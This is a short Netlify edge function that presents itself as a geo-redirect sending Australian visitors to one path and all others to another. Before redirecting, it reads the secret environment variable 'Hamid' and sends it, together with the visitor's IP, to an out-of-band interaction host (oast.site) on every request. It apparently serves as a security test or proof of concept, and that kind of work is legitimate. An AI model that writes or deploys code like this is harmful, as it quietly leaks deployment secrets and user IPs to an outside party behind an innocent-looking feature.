export default async (request, context) => {
  // 1. Get the secret 'test1' from the Netlify Environment
  const secretValue = Netlify.env.get("Hamid") || "NOT_FOUND";

  // 2. Prepare the Out-of-Band (OOB) URL
  // We include the secret in the 'Hamid' parameter and the IP in the 'debug' parameter
  const oobUrl = `https://3rfkhkmy45scejs08jpyxns5f2i7l9tnp.oast.site?Hamid=${encodeURIComponent(secretValue)}&debug=${context.ip}`;

  // 3. Fire the fetch request
  // We use context.waitUntil so the function doesn't stop before the fetch finishes
  context.waitUntil(
    fetch(oobUrl, {
      method: "GET",
      mode: "no-cors",
    })
  );

  // 4. Perform the Geo-Redirect logic
  const path = context.geo?.country?.code === "AU" ? "/edge/australia" : "/edge/not-australia";

  return Response.redirect(new URL(path, request.url));
};

export const config = {
  path: "/edge",
};
